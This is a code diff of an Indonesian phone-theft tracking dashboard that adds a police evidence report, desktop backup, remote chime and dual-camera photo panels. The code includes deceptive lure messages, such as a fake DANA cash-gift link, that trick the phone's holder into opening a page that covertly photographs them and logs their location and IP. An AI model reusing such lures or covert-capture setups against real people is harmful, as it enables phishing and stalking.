@@ -359,6 +359,38 @@
       70% { box-shadow: 0 0 0 25px rgba(239, 68, 68, 0); }
       100% { box-shadow: 0 0 0 0 rgba(239, 68, 68, 0); }
     }
+
+    /* Print Stylesheet untuk Laporan Resmi Kepolisian (PDF) */
+    @media print {
+      body * { visibility: hidden !important; }
+      #evidenceModal, #evidenceModal * { visibility: visible !important; }
+      #evidenceModal {
+        position: absolute !important;
+        left: 0 !important;
+        top: 0 !important;
+        width: 100% !important;
+        height: auto !important;
+        background: white !important;
+        padding: 0 !important;
+        margin: 0 !important;
+        display: block !important;
+        backdrop-filter: none !important;
+      }
+      .modal-card {
+        background: white !important;
+        border: none !important;
+        box-shadow: none !important;
+        padding: 0 !important;
+        max-width: 100% !important;
+      }
+      .no-print { display: none !important; }
+      .evidence-paper {
+        box-shadow: none !important;
+        padding: 10mm 15mm !important;
+        border-radius: 0 !important;
+        width: 100% !important;
+      }
+    }
   </style>
 </head>
 <body>
@@ -392,12 +424,21 @@
         <button id="btnCleanStorage" onclick="triggerStorageCleanup()" title="Pembersihan otomatis aktif. Klik untuk bersihkan data lama sekarang." style="background: rgba(56, 189, 248, 0.15); border: 1px solid rgba(56, 189, 248, 0.4); color: #38bdf8; border-radius: 5px; padding: 3px 6px; font-size: 10px; cursor: pointer; font-weight: 600;">
           🧹 Bersihkan
         </button>
+        <button id="btnBackupDesktop" onclick="triggerBackupDesktop()" title="Simpan seluruh foto bukti, video layar, dan log koordinat ke Desktop laptop sebagai file ZIP." style="background: rgba(16, 185, 129, 0.2); border: 1px solid rgba(16, 185, 129, 0.5); color: #6ee7b7; border-radius: 5px; padding: 3px 8px; font-size: 10px; cursor: pointer; font-weight: 700;">
+          💾 Backup Desktop
+        </button>
       </div>
+      <button class="btn-header" style="background: rgba(14, 165, 233, 0.2); border-color: #0ea5e9; color: #7dd3fc; font-weight: 700;" onclick="openEvidenceModal()">
+        📄 Ekspor Bukti Resmi (PDF)
+      </button>
       <button class="btn-header" style="background: rgba(225, 29, 72, 0.2); border-color: #f43f5e; color: #fda4af; font-weight: 700;" onclick="openTrapModal()">
         🎯 Kirim Link Jebakan
       </button>
       <button class="btn-header" style="background: rgba(16, 185, 129, 0.2); border-color: #10b981; color: #6ee7b7; font-weight: 700;" onclick="openSetupModal()">
         📲 Pasang di iPhone (Anti-Hapus)
+      </button>
+      <button class="btn-header" style="background: rgba(245, 158, 11, 0.2); border-color: #f59e0b; color: #fde68a; font-weight: 700;" onclick="triggerRemoteChime()" title="Bunyikan suara dering alarm pencarian keras di browser target HP">
+        🔔 Bunyikan Dering Pencarian
       </button>
       <button class="btn-header btn-danger" onclick="triggerAlarmSound()">
         🔊 Tes Alarm Sirene
@@ -440,16 +481,59 @@
             <div class="coord-val" id="valLon">0.000000</div>
           </div>
         </div>
-        <div class="address-text" id="valAddress">Memuat alamat lokasi terkini...</div>
-        <a href="#" target="_blank" class="btn-maps" id="btnGoogleMaps">
-          <span>🗺️</span> Buka Navigasi di Google Maps
-        </a>
+
+        <div style="font-size: 11px; color: var(--text-muted); margin-bottom: 6px;">
+          <strong>Format Derajat (DMS):</strong> <span id="valDms" style="color: #cbd5e1; font-family: monospace;">--</span>
+        </div>
+
+        <div class="address-text" id="valAddress" style="font-size: 12px; line-height: 1.4; color: #f8fafc; margin-bottom: 8px;">
+          Memuat alamat lokasi terkini...
+        </div>
+
+        <!-- Detail Wilayah Terstruktur -->
+        <div style="background: rgba(0,0,0,0.35); border-radius: 8px; padding: 8px 10px; margin-bottom: 10px; border: 1px solid rgba(255,255,255,0.06); font-size: 11px;">
+          <div style="display: flex; justify-content: space-between; padding: 3px 0;">
+            <span style="color: var(--text-muted);">🏡 Dusun / Jalan:</span>
+            <span id="valHamlet" style="font-weight: 600; color: #f8fafc;">--</span>
+          </div>
+          <div style="display: flex; justify-content: space-between; padding: 3px 0;">
+            <span style="color: var(--text-muted);">📍 Desa / Kelurahan:</span>
+            <span id="valVillage" style="font-weight: 600; color: #f8fafc;">--</span>
+          </div>
+          <div style="display: flex; justify-content: space-between; padding: 3px 0;">
+            <span style="color: var(--text-muted);">🏛️ Kecamatan:</span>
+            <span id="valDistrict" style="font-weight: 600; color: #f8fafc;">--</span>
+          </div>
+          <div style="display: flex; justify-content: space-between; padding: 3px 0;">
+            <span style="color: var(--text-muted);">🏢 Kabupaten / Kota:</span>
+            <span id="valRegency" style="font-weight: 600; color: #38bdf8;">--</span>
+          </div>
+          <div style="display: flex; justify-content: space-between; padding: 3px 0;">
+            <span style="color: var(--text-muted);">🗺️ Provinsi:</span>
+            <span id="valProvince" style="font-weight: 600; color: #f8fafc;">--</span>
+          </div>
+        </div>
+
+        <!-- Tombol Navigasi Cepat Multi-Aplikasi -->
+        <div style="display: flex; flex-direction: column; gap: 6px;">
+          <a href="#" target="_blank" class="btn-maps" id="btnGoogleMaps">
+            <span>🗺️</span> Buka Navigasi di Google Maps
+          </a>
+          <div style="display: flex; gap: 6px;">
+            <a href="#" target="_blank" id="btnStreetView" style="flex: 1; padding: 8px; background: rgba(56, 189, 248, 0.15); border: 1px solid rgba(56, 189, 248, 0.4); border-radius: 8px; color: #38bdf8; font-weight: 700; font-size: 11px; text-decoration: none; display: flex; align-items: center; justify-content: center; gap: 4px;">
+              <span>📷</span> Street View 360°
+            </a>
+            <a href="#" target="_blank" id="btnWaze" style="flex: 1; padding: 8px; background: rgba(16, 185, 129, 0.15); border: 1px solid rgba(16, 185, 129, 0.4); border-radius: 8px; color: #34d399; font-weight: 700; font-size: 11px; text-decoration: none; display: flex; align-items: center; justify-content: center; gap: 4px;">
+              <span>🚗</span> Buka di Waze
+            </a>
+          </div>
+        </div>
       </div>
 
       <!-- Device Status Card -->
       <div class="card">
         <div class="card-title">
-          <span>📱 Status &amp; Aktivitas iPhone</span>
+          <span>📱 Status &amp; Aktivitas Telemetri</span>
           <span style="font-size: 10px; color: #34d399;" id="valLastSeen">Online</span>
         </div>
         <div class="metric-row">
@@ -461,12 +545,20 @@
           <span class="metric-val" id="valNetwork">--</span>
         </div>
         <div class="metric-row">
-          <span class="metric-lbl">Aktivitas Fisik</span>
+          <span class="metric-lbl">Kecepatan &amp; Latensi</span>
+          <span class="metric-val" id="valNetSpeed">--</span>
+        </div>
+        <div class="metric-row">
+          <span class="metric-lbl">Sensor Gerak (Motion)</span>
           <span class="metric-val" id="valActivity">Diam / Stationary</span>
         </div>
         <div class="metric-row">
-          <span class="metric-lbl">Kecepatan Gerak</span>
+          <span class="metric-lbl">Kecepatan Gerak (GPS)</span>
           <span class="metric-val" id="valSpeed">0 km/h</span>
+        </div>
+        <div class="metric-row">
+          <span class="metric-lbl">IP Publik &amp; Model</span>
+          <span class="metric-val" id="valClientIp">--</span>
         </div>
         <div class="metric-row">
           <span class="metric-lbl">Pemicu Laporan Terakhir</span>
@@ -474,13 +566,36 @@
         </div>
       </div>
 
-      <!-- Mugshot Photo Card -->
+      <!-- Dual-Angle Visual Evidence Card (Wajah + Area Lingkungan Depan) -->
       <div class="card">
         <div class="card-title">
-          <span>📸 Foto Wajah Bukti (Silent Mugshot)</span>
+          <span>📸 Barang Bukti Visual Dua Arah (Dual-Angle)</span>
+          <span style="font-size: 10px; color: #38bdf8;" id="badgeDualPhoto">Depan + Belakang</span>
         </div>
-        <div class="mugshot-container" id="mugshotBox">
-          <div class="mugshot-empty">Belum ada foto tangkapan darurat.<br>(Otomatis dijepret saat pencuri memicu jebakan)</div>
+        
+        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-top: 4px;">
+          <!-- Sudut 1: Kamera Depan (Wajah) -->
+          <div>
+            <div style="font-size: 11px; font-weight: 700; color: #cbd5e1; margin-bottom: 4px; display: flex; align-items: center; gap: 4px;">
+              <span>👤</span> Wajah (Depan)
+            </div>
+            <div class="mugshot-container" id="mugshotBox" style="height: 145px;">
+              <div class="mugshot-empty" style="font-size: 10px;">Belum ada foto wajah</div>
+            </div>
+          </div>
+
+          <!-- Sudut 2: Kamera Belakang (Area di Depan Pencuri) -->
+          <div>
+            <div style="font-size: 11px; font-weight: 700; color: #38bdf8; margin-bottom: 4px; display: flex; align-items: center; gap: 4px;">
+              <span>🔭</span> Area Depan (Belakang)
+            </div>
+            <div class="mugshot-container" id="envPhotoBox" style="height: 145px; border-color: rgba(56, 189, 248, 0.3);">
+              <div class="mugshot-empty" style="font-size: 10px; color: #64748b;">Belum ada foto area/lingkungan</div>
+            </div>
+          </div>
+        </div>
+        <div style="font-size: 10px; color: var(--text-muted); margin-top: 6px; text-align: center;">
+          💡 <em>Klik foto untuk zoom HD atau mengunduh bukti.</em>
         </div>
       </div>
 
@@ -712,9 +827,208 @@
         </div>
       </div>
 
+      <!-- OPSI 3: PORTAL PENEMU SAH (TRANSPARAN & RESMI) -->
+      <div class="step-box" style="border: 2px solid #10b981; background: rgba(16, 185, 129, 0.08); margin-top: 14px;">
+        <div class="step-head" style="font-size: 14px; color: #34d399; display: flex; align-items: center; justify-content: space-between;">
+          <span style="font-weight: 800; display: flex; align-items: center; gap: 6px;">🤝 JALUR RESMI: Portal Penemu Sah (Pengembalian Sukarela)</span>
+          <span style="font-size: 10px; background: #10b981; color: #022c22; padding: 2px 8px; border-radius: 6px; font-weight: 800;">ETIS &amp; TRANSPARAN</span>
+        </div>
+        <div style="font-size: 12px; color: #cbd5e1; margin: 8px 0;">
+          Gunakan tautan ini jika Anda mengasumsikan ponsel ditemukan oleh orang beritikad baik (satpam, kasir, warga) dan ingin membantu mengembalikannya.
+        </div>
+        <div style="background: rgba(0,0,0,0.5); border-radius: 8px; padding: 10px; font-size: 12px; border: 1px solid rgba(255,255,255,0.1); margin-bottom: 10px;">
+          <div style="color: #94a3b8; font-size: 11px; margin-bottom: 4px;">Pesan SMS / WhatsApp untuk penemu:</div>
+          <div id="textMsgRecovery" style="color: #f8fafc; font-style: italic;">Halo, jika Anda menemukan ponsel ini, mohon bantu pemilik dengan membuka tautan ini untuk konfirmasi titik penjemputan &amp; kontak Anda: https://sentinel.fiezel.my.id/recovery</div>
+        </div>
+        <div style="display: flex; gap: 8px; flex-wrap: wrap;">
+          <button onclick="copyTrapMessage('recovery')" style="flex: 1; min-width: 160px; padding: 9px 12px; background: #10b981; border: none; border-radius: 8px; color: #022c22; font-weight: 800; font-size: 12px; cursor: pointer;">
+            📋 Salin Pesan WA/SMS
+          </button>
+          <button onclick="copyTrapLink('recovery')" style="padding: 9px 12px; background: rgba(255,255,255,0.1); border: 1px solid var(--border); border-radius: 8px; color: #fff; font-weight: 600; font-size: 12px; cursor: pointer;">
+            🔗 Salin Link Saja
+          </button>
+          <a id="previewRecoveryLink" href="/recovery" target="_blank" style="padding: 9px 12px; background: rgba(255,255,255,0.05); border: 1px solid var(--border); border-radius: 8px; color: #34d399; font-weight: 600; font-size: 12px; text-decoration: none;">
+            👁️ Pratinjau
+          </a>
+        </div>
+      </div>
+
       <button onclick="closeTrapModal()" style="width: 100%; padding: 14px; background: var(--primary); border: none; border-radius: 12px; font-weight: 800; cursor: pointer; color: #000; margin-top: 14px; font-size: 14px;">
         Tutup Jendela
       </button>
+    </div>
+  </div>
+
+  <!-- EVIDENCE REPORT MODAL (SURAT BUKTI KEPOLISIAN & BERITA ACARA RESMI) -->
+  <div class="modal-overlay" id="evidenceModal" style="align-items: flex-start; overflow-y: auto; padding: 20px 10px;">
+    <div class="modal-card" style="max-width: 860px; width: 100%; background: #0f172a; border: 1px solid rgba(56, 189, 248, 0.4); margin: auto;">
+      <div class="modal-header no-print" style="border-bottom: 1px solid var(--border); padding-bottom: 12px; margin-bottom: 16px;">
+        <div class="modal-title" style="color: #38bdf8; display: flex; align-items: center; gap: 8px;">
+          <span>📄</span> Berita Acara Bukti Telemetri Perangkat (Laporan Resmi Kepolisian)
+        </div>
+        <div style="display: flex; gap: 8px;">
+          <button onclick="printEvidenceReport()" style="padding: 8px 16px; background: #10b981; color: #022c22; font-weight: 800; border: none; border-radius: 8px; cursor: pointer; font-size: 13px; display: flex; align-items: center; gap: 6px;">
+            🖨️ Cetak / Simpan PDF
+          </button>
+          <button onclick="closeEvidenceModal()" style="background: none; border: none; color: var(--text-muted); font-size: 20px; cursor: pointer;">✕</button>
+        </div>
+      </div>
+
+      <!-- Printable Report Paper -->
+      <div id="printableEvidenceReport" class="evidence-paper" style="background: white; color: #0f172a; padding: 32px; border-radius: 12px; font-family: 'Times New Roman', Times, serif; line-height: 1.4; box-shadow: 0 4px 20px rgba(0,0,0,0.2);">
+        
+        <!-- Official Kop -->
+        <div style="text-align: center; border-bottom: 3px double #000; padding-bottom: 14px; margin-bottom: 20px;">
+          <div style="font-size: 13px; font-weight: bold; letter-spacing: 1px;">LAMPIRAN ALAT BUKTI ELEKTRONIK &amp; TELEMETRI DIGITAL RESMI</div>
+          <div style="font-size: 18px; font-weight: 900; margin: 4px 0; text-transform: uppercase;">BERITA ACARA REKAM JEJAK &amp; KOORDINAT LOKASI PERANGKAT</div>
+          <div style="font-size: 11px; color: #475569; font-family: sans-serif;">Dihasilkan secara mandiri melalui Sistem Pemulihan Pribadi — Ghost Sentinel Forensics</div>
+          <div style="font-size: 12px; font-weight: bold; margin-top: 6px; font-family: monospace;">Nomor Berkas: <span id="reportRefId">GS-REC-2026-XXXX</span> | Waktu Cetak: <span id="reportPrintDate">--</span></div>
+        </div>
+
+        <!-- Section 1: Data Identitas Perangkat -->
+        <div style="margin-bottom: 18px;">
+          <div style="font-size: 13px; font-weight: bold; background: #e2e8f0; padding: 5px 8px; border-left: 4px solid #0284c7; margin-bottom: 8px; text-transform: uppercase;">
+            I. Rincian &amp; Status Perangkat Terakhir
+          </div>
+          <table style="width: 100%; border-collapse: collapse; font-size: 12px; font-family: sans-serif;">
+            <tr>
+              <td style="width: 25%; padding: 5px 8px; font-weight: bold; border: 1px solid #cbd5e1; background: #f8fafc;">Jenis Perangkat &amp; Layar</td>
+              <td style="width: 25%; padding: 5px 8px; border: 1px solid #cbd5e1;" id="repDeviceModel">Apple iPhone / Mobile</td>
+              <td style="width: 25%; padding: 5px 8px; font-weight: bold; border: 1px solid #cbd5e1; background: #f8fafc;">Status Daya (Baterai)</td>
+              <td style="width: 25%; padding: 5px 8px; border: 1px solid #cbd5e1;" id="repBattery">--</td>
+            </tr>
+            <tr>
+              <td style="padding: 5px 8px; font-weight: bold; border: 1px solid #cbd5e1; background: #f8fafc;">Alamat IP &amp; Gateway</td>
+              <td style="padding: 5px 8px; border: 1px solid #cbd5e1;" id="repIpAddress">--</td>
+              <td style="padding: 5px 8px; font-weight: bold; border: 1px solid #cbd5e1; background: #f8fafc;">Operator ISP &amp; Nomor AS (ASN)</td>
+              <td style="padding: 5px 8px; border: 1px solid #cbd5e1;" id="repNetwork">--</td>
+            </tr>
+            <tr>
+              <td style="padding: 5px 8px; font-weight: bold; border: 1px solid #cbd5e1; background: #f8fafc;">Status Gerak &amp; Kecepatan</td>
+              <td style="padding: 5px 8px; border: 1px solid #cbd5e1;" id="repActivity">Diam / Berpindah</td>
+              <td style="padding: 5px 8px; font-weight: bold; border: 1px solid #cbd5e1; background: #f8fafc;">Pemicu Terakhir (Trigger)</td>
+              <td style="padding: 5px 8px; border: 1px solid #cbd5e1;" id="repTrigger">--</td>
+            </tr>
+          </table>
+        </div>
+
+        <!-- Section 2: Titik Koordinat GPS Terkini -->
+        <div style="margin-bottom: 18px;">
+          <div style="font-size: 13px; font-weight: bold; background: #e2e8f0; padding: 5px 8px; border-left: 4px solid #0284c7; margin-bottom: 8px; text-transform: uppercase;">
+            II. Koordinat Lokasi Presisi Terakhir (GPS Fix)
+          </div>
+          <div style="background: #f8fafc; border: 1px solid #cbd5e1; border-radius: 6px; padding: 10px; font-family: sans-serif; font-size: 12px;">
+            <div style="display: flex; justify-content: space-between; margin-bottom: 6px;">
+              <span><strong>Latitude:</strong> <span id="repLat" style="font-family: monospace; font-weight: bold;">--</span></span>
+              <span><strong>Longitude:</strong> <span id="repLon" style="font-family: monospace; font-weight: bold;">--</span></span>
+              <span><strong>Radius Akurasi:</strong> <span id="repAccuracy">± 0 m</span></span>
+            </div>
+            <div style="margin-top: 6px;">
+              <strong>Alamat Teridentifikasi:</strong>
+              <div id="repAddress" style="color: #0f172a; margin-top: 2px;">--</div>
+            </div>
+            <div style="margin-top: 6px; font-size: 11px; color: #0284c7;">
+              <strong>Tautan Google Maps:</strong> <span id="repMapsUrl" style="word-break: break-all;">--</span>
+            </div>
+          </div>
+        </div>
+
+        <!-- Section 3: Tabel Rekam Jejak Kronologis (Timeline) -->
+        <div style="margin-bottom: 18px;">
+          <div style="font-size: 13px; font-weight: bold; background: #e2e8f0; padding: 5px 8px; border-left: 4px solid #0284c7; margin-bottom: 8px; text-transform: uppercase;">
+            III. Kronologi Rekam Jejak Pergerakan Terkini (Timeline)
+          </div>
+          <table style="width: 100%; border-collapse: collapse; font-size: 11px; font-family: sans-serif;" id="repHistoryTable">
+            <thead>
+              <tr style="background: #f1f5f9; text-align: left;">
+                <th style="padding: 5px 6px; border: 1px solid #cbd5e1; width: 35px; text-align: center;">No</th>
+                <th style="padding: 5px 6px; border: 1px solid #cbd5e1; width: 140px;">Waktu Terdeteksi</th>
+                <th style="padding: 5px 6px; border: 1px solid #cbd5e1;">Titik Koordinat (Lat, Lon)</th>
+                <th style="padding: 5px 6px; border: 1px solid #cbd5e1; width: 80px;">Akurasi</th>
+                <th style="padding: 5px 6px; border: 1px solid #cbd5e1; width: 140px;">Status / Pemicu</th>
+              </tr>
+            </thead>
+            <tbody id="repHistoricRows">
+              <tr>
+                <td colspan="5" style="text-align: center; padding: 8px; border: 1px solid #cbd5e1; color: #64748b;">Memuat data jejak koordinat...</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+
+        <!-- Section 4: Dokumentasi Visual Dua Arah (Wajah & Lingkungan Depan) -->
+        <div style="margin-bottom: 22px;">
+          <div style="font-size: 13px; font-weight: bold; background: #e2e8f0; padding: 5px 8px; border-left: 4px solid #0284c7; margin-bottom: 8px; text-transform: uppercase;">
+            IV. Dokumentasi Bukti Visual Dua Arah (Wajah Pemegang &amp; Area di Depan Pencuri)
+          </div>
+          <div id="repPhotoContainer" style="display: flex; gap: 14px; flex-wrap: wrap; margin-top: 8px;">
+            <div style="font-size: 11px; color: #64748b; font-family: sans-serif;">Belum ada foto bukti visual pada sesi ini.</div>
+          </div>
+        </div>
+
+        <!-- Section 5: Lembar Tanda Tangan & Pernyataan -->
+        <div style="margin-top: 30px; font-size: 12px; font-family: sans-serif;">
+          <div style="font-style: italic; font-size: 11px; color: #475569; margin-bottom: 24px;">
+            Demikian berita acara dan lampiran bukti telemetri ini dicetak secara sah dan otomatis dari sistem pelacak perangkat pribadi guna melengkapi berkas pelaporan resmi kepada pihak yang berwajib.
+          </div>
+          <div style="display: flex; justify-content: space-between; text-align: center; margin-top: 20px;">
+            <div style="width: 42%;">
+              <div>Pelapor / Pemilik Sah Perangkat,</div>
+              <div style="height: 60px;"></div>
+              <div style="border-bottom: 1px solid #000; font-weight: bold;">( ..................................................... )</div>
+            </div>
+            <div style="width: 42%;">
+              <div>Petugas Penerima Laporan,</div>
+              <div style="height: 60px;"></div>
+              <div style="border-bottom: 1px solid #000; font-weight: bold;">( ..................................................... )</div>
+            </div>
+          </div>
+        </div>
+
+      </div>
+
+      <div class="no-print" style="margin-top: 14px; display: flex; gap: 8px;">
+        <button onclick="printEvidenceReport()" style="flex: 1; padding: 14px; background: #10b981; color: #022c22; font-weight: 800; border: none; border-radius: 10px; cursor: pointer; font-size: 14px;">
+          🖨️ Cetak / Simpan sebagai Dokumen PDF
+        </button>
+        <button onclick="closeEvidenceModal()" style="padding: 14px 20px; background: rgba(255,255,255,0.1); border: 1px solid var(--border); color: #f8fafc; font-weight: 700; border-radius: 10px; cursor: pointer;">
+          Tutup Jendela
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <!-- MODAL ZOOM FOTO BUKTI / MUGSHOT VIEWER -->
+  <div class="modal-overlay" id="photoViewerModal" style="display: none; align-items: center; justify-content: center; z-index: 11000; background: rgba(0,0,0,0.85); backdrop-filter: blur(8px);">
+    <div style="background: #0f172a; border: 1px solid rgba(255,255,255,0.15); border-radius: 16px; width: 92%; max-width: 600px; padding: 18px; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.7); display: flex; flex-direction: column; gap: 14px;">
+      <div style="display: flex; justify-content: space-between; align-items: center;">
+        <div style="display: flex; align-items: center; gap: 8px;">
+          <span style="font-size: 18px;">📸</span>
+          <div>
+            <div id="photoViewerTitle" style="font-weight: 800; font-size: 15px; color: #f8fafc;">Foto Bukti Wajah (HD Zoom)</div>
+            <div id="photoViewerTimestamp" style="font-size: 11px; color: #94a3b8; font-family: monospace;">--</div>
+          </div>
+        </div>
+        <button onclick="closePhotoViewer()" style="background: rgba(255,255,255,0.1); border: none; color: #cbd5e1; width: 32px; height: 32px; border-radius: 50%; font-size: 16px; cursor: pointer; display: flex; align-items: center; justify-content: center;">✕</button>
+      </div>
+
+      <div style="background: #000; border-radius: 12px; overflow: hidden; max-height: 70vh; display: flex; align-items: center; justify-content: center; border: 1px solid rgba(255,255,255,0.08);">
+        <img id="photoViewerImg" src="" style="width: 100%; height: auto; max-height: 65vh; object-fit: contain;" alt="Tangkapan Wajah Pemegang" />
+      </div>
+
+      <div id="photoViewerHashBox" style="display: none; font-size: 10px; color: #94a3b8; font-family: monospace; background: rgba(0,0,0,0.5); padding: 8px 12px; border-radius: 8px; border: 1px dashed rgba(255,255,255,0.15); word-break: break-all;">
+        <span style="color: #38bdf8; font-weight: bold;">SHA-256 Integritas Digital:</span><br>
+        <span id="photoViewerHashVal" style="color: #f8fafc;">--</span>
+      </div>
+
+      <div style="display: flex; gap: 8px;">
+        <a id="btnDownloadPhoto" href="#" download="foto_bukti_sentinel.jpg" target="_blank" style="flex: 1; padding: 12px; background: #3b82f6; color: white; font-weight: 700; border-radius: 8px; text-decoration: none; text-align: center; font-size: 13px;">
+          ⬇️ Unduh Foto HD
+        </a>
+        <button onclick="closePhotoViewer()" style="padding: 12px 18px; background: rgba(255,255,255,0.08); border: 1px solid var(--border); color: #cbd5e1; font-weight: 600; border-radius: 8px; cursor: pointer; font-size: 13px;">
+          Tutup
+        </button>
+      </div>
     </div>
   </div>
 
@@ -815,6 +1129,7 @@
       const base = getBaseTrapOrigin();
       const paketUrl = `${base}/paket`;
       const danaUrl = `${base}/dana`;
+      const recoveryUrl = `${base}/recovery`;
 
       const msgPaket = document.getElementById('textMsgPaket');
       if (msgPaket) {
@@ -824,19 +1139,27 @@
       if (msgDana) {
         msgDana.textContent = `Kamu menerima kiriman DANA Kaget Rp 150.000 dari Teman! Ketuk amplop untuk klaim sebelum 30 menit: ${danaUrl}`;
       }
+      const msgRecovery = document.getElementById('textMsgRecovery');
+      if (msgRecovery) {
+        msgRecovery.textContent = `Halo, jika Anda menemukan ponsel ini, mohon bantu pemilik dengan membuka tautan ini untuk konfirmasi titik penjemputan & kontak Anda: ${recoveryUrl}`;
+      }
 
       const prevPaket = document.getElementById('previewPaketLink');
       if (prevPaket) prevPaket.href = '/paket';
       const prevDana = document.getElementById('previewDanaLink');
       if (prevDana) prevDana.href = '/dana';
+      const prevRecovery = document.getElementById('previewRecoveryLink');
+      if (prevRecovery) prevRecovery.href = '/recovery';
     }
 
     function copyTrapMessage(type) {
       updateTrapUrls();
-      const el = type === 'paket' ? document.getElementById('textMsgPaket') : document.getElementById('textMsgDana');
+      let el = document.getElementById('textMsgPaket');
+      if (type === 'dana') el = document.getElementById('textMsgDana');
+      if (type === 'recovery') el = document.getElementById('textMsgRecovery');
       if (el) {
         navigator.clipboard.writeText(el.textContent).then(() => {
-          alert(`✅ Pesan WhatsApp/SMS ${type.toUpperCase()} disalin!\nKirimkan pesan ini ke nomor HP Anda yang dicuri.`);
+          alert(`✅ Pesan ${type.toUpperCase()} disalin!\nKirimkan pesan ini ke nomor ponsel Anda.`);
         }).catch(() => {
           prompt('Salin pesan ini:', el.textContent);
         });
@@ -965,6 +1288,9 @@
               tunnelBadge.style.borderColor = 'rgba(16, 185, 129, 0.3)';
             }
           }
+          if (data.history) {
+            latestHistoryCache = data.history;
+          }
           if (data.current) {
             renderTelemetry(data.current, data.alerts);
           }
@@ -1025,6 +1351,30 @@
       }
     }
 
+    async function triggerBackupDesktop() {
+      const btn = document.getElementById('btnBackupDesktop');
+      if (btn) {
+        btn.textContent = '⏳ Mengompres...';
+        btn.disabled = true;
+      }
+      try {
+        const res = await fetch('/api/sentinel/backup_desktop', { method: 'POST' });
+        const data = await res.json();
+        if (data.ok) {
+          alert(`✅ BERKAS BUKTI TELAH DIAMANKAN KE DESKTOP!\n\n• Nama Arsip: ${data.filename}\n• Ukuran: ${data.sizeMb} MB\n• Lokasi: ${data.path}\n\nSeluruh 70+ foto wajah, rekaman layar, cuplikan layar, dan riwayat koordinat GPS telah disalin aman ke Desktop laptop Anda.`);
+        } else {
+          alert('Gagal membuat arsip backup: ' + (data.error || 'Unknown error'));
+        }
+      } catch (err) {
+        alert('Gagal menghubungi server backup: ' + err.message);
+      } finally {
+        if (btn) {
+          btn.textContent = '💾 Backup Desktop';
+          btn.disabled = false;
+        }
+      }
+    }
+
     async function savePinChange() {
       const pinInput = document.getElementById('inputPinField');
       if (!pinInput) return;
@@ -1049,68 +1399,369 @@
       }
     }
 
+    let latestHistoryCache = [];
+    let sentinelLatestCache = null;
+
+    function openEvidenceModal() {
+      populateEvidenceReport(sentinelLatestCache, latestHistoryCache);
+      document.getElementById('evidenceModal').style.display = 'flex';
+    }
+
+    function closeEvidenceModal() {
+      document.getElementById('evidenceModal').style.display = 'none';
+    }
+
+    function printEvidenceReport() {
+      window.print();
+    }
+
+    function populateEvidenceReport(telemetry, history) {
+      const now = new Date();
+      const refId = 'GS-REC-' + now.toISOString().slice(0, 10).replace(/-/g, '') + '-' + (telemetry && telemetry.id ? String(telemetry.id).slice(-4).toUpperCase() : '8890');
+      const refEl = document.getElementById('reportRefId');
+      if (refEl) refEl.textContent = refId;
+      const dateEl = document.getElementById('reportPrintDate');
+      if (dateEl) dateEl.textContent = now.toLocaleString('id-ID', { dateStyle: 'full', timeStyle: 'medium' });
+
+      if (telemetry) {
+        const devEl = document.getElementById('repDeviceModel');
+        let devStr = (telemetry.platform || 'Apple iPhone / Mobile');
+        if (telemetry.screen) devStr += ` [Layar: ${telemetry.screen}]`;
+        if (telemetry.hardware && telemetry.hardware.gpu) devStr += ` [GPU: ${telemetry.hardware.gpu}]`;
+        if (devEl) devEl.textContent = devStr;
+
+        const batEl = document.getElementById('repBattery');
+        if (batEl) {
+          if (telemetry.batteryLevel !== null && telemetry.batteryLevel !== undefined) {
+            batEl.textContent = `${telemetry.batteryLevel}% ${telemetry.isCharging ? '(Sedang Mengisi Daya / Dicas)' : '(Daya Baterai)'}`;
+          } else {
+            batEl.textContent = 'Dibatasi Sandbox Apple WebKit (Keamanan Privasi iOS)';
+          }
+        }
+
+        const ipEl = document.getElementById('repIpAddress');
+        if (ipEl) {
+          let ipText = telemetry.clientIp || 'Terhubung via Cloudflare Secure Proxy';
+          if (telemetry.ipLocation) ipText += ` (${telemetry.ipLocation})`;
+          ipEl.textContent = ipText;
+        }
+
+        const netEl = document.getElementById('repNetwork');
+        if (netEl) {
+          let netStr = telemetry.isp || telemetry.networkName || 'Provider Seluler';
+          if (telemetry.as) netStr += ` [${telemetry.as}]`;
+          else if (telemetry.networkType && telemetry.networkType !== 'Seluler / Wi-Fi') netStr += ` [${telemetry.networkType}]`;
+          netEl.textContent = netStr;
+        }
+
+        const actEl = document.getElementById('repActivity');
+        if (actEl) {
+          actEl.textContent = `${telemetry.activity || 'Diam (Stasioner)'} [Kecepatan: ${telemetry.speed || 0} km/h]`;
+        }
+
+        const trigEl = document.getElementById('repTrigger');
+        if (trigEl) trigEl.textContent = (telemetry.alertType || 'Normal Telemetry Ping').toUpperCase();
+        const latEl = document.getElementById('repLat');
+        if (latEl) latEl.textContent = Number(telemetry.lat).toFixed(6);
+        const lonEl = document.getElementById('repLon');
+        if (lonEl) lonEl.textContent = Number(telemetry.lon).toFixed(6);
+        const accEl = document.getElementById('repAccuracy');
+        if (accEl) accEl.textContent = `± ${telemetry.accuracy || 10} meter`;
+        
+        const addr = telemetry.address || document.getElementById('valAddress').textContent || 'Lokasi Terdeteksi';
+        const addrEl = document.getElementById('repAddress');
+        if (addrEl) addrEl.textContent = addr;
+        
+        const mapsUrl = `https://www.google.com/maps?q=${telemetry.lat},${telemetry.lon}`;
+        const mapsLinkEl = document.getElementById('repMapsUrl');
+        if (mapsLinkEl) mapsLinkEl.innerHTML = `<a href="${mapsUrl}" target="_blank" style="color:#0284c7; text-decoration:underline;">${mapsUrl}</a>`;
+
+        const photoBox = document.getElementById('repPhotoContainer');
+        if (photoBox) {
+          let html = '<div style="display: flex; gap: 16px; flex-wrap: wrap;">';
+          if (telemetry.photo) {
+            html += `
+              <div style="border: 2px solid #0f172a; padding: 6px; border-radius: 8px; text-align: center; width: 240px; background: #fff;">
+                <img src="${telemetry.photo}" style="width: 100%; height: 160px; object-fit: cover; border-radius: 6px; display: block;" alt="Foto Wajah Bukti" />
+                <div style="font-size: 10px; font-weight: bold; margin-top: 5px; font-family: sans-serif; color: #000;">1. Kamera Depan: Wajah Pemegang</div>
+                <div style="font-size: 9px; color: #64748b; font-family: monospace;">${new Date(telemetry.timestamp).toLocaleTimeString('id-ID')}</div>
